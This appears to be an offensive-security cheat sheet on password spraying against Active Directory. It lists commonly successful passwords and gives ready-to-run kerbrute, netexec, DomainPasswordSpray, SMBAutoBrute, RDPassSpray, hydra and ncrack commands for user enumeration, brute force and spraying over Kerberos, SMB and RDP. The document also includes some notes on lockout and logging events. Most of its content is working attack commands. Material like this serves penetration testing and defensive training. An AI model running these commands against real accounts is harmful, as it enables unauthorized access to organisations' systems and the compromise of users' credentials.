# Password - Spraying

Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 

> The builtin Administrator account (RID:500) cannot be locked out of the system no matter how many failed logon attempts it accumulates. 

Most of the time the best passwords to spray are :

- `P@ssw0rd01`, `Password123`, `Password1`, `Hello123`, `mimikatz`
- `Welcome1`/`Welcome01`
- $Companyname1 :`$Microsoft1`
- SeasonYear : `Winter2019*`, `Spring2020!`, `Summer2018?`, `Summer2020`, `July2020!`
- Default AD password with simple mutations such as number-1, special character iteration (*,?,!,#)
- Empty Password (Hash:31d6cfe0d16ae931b73c59d7e0c089c0)


## Kerberos pre-auth bruteforcing

Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.

> Kerberos pre-authentication errors are not logged in Active Directory with a normal **Logon failure event (4625)**, but rather with specific logs to **Kerberos pre-authentication failure (4771)**.

* Username bruteforce
  ```powershell
  root@kali:~$ ./kerbrute_linux_amd64 userenum -d domain.local --dc 10.10.10.10 usernames.txt
  ```
* Password bruteforce
  ```powershell
  root@kali:~$ ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 rockyou.txt username
  ```
* Password spray
  ```powershell
  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt Password123
  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt rockyou.txt
  root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
  ```


## Spray a pre-generated passwords list

* Using `netexec` and `mp64` to generate passwords and spray them against SMB services on the network.
  ```powershell
  netexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
  ```
* Using `DomainPasswordSpray` to spray a password against all users of a domain.
  ```powershell
  # https://github.com/dafthack/DomainPasswordSpray
  Invoke-DomainPasswordSpray -Password Summer2021!
  # /!\ be careful with the account lockout !
  Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
  ```
* Using `SMBAutoBrute`.
  ```powershell
  Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
  ```


## Spray passwords against the RDP service

* Using [RDPassSpray](https://github.com/xFreed0m/RDPassSpray) to target RDP services.
  ```powershell
  git clone https://github.com/xFreed0m/RDPassSpray
  python3 RDPassSpray.py -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -t [TARGET IP]
  ```
* Using [hydra](https://github.com/vanhauser-thc/thc-hydra) and [ncrack](https://github.com/nmap/ncrack) to target RDP services.
  ```powershell
  hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.10
  ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
  ```


## BadPwdCount attribute

> The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.

```powershell
$ netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
```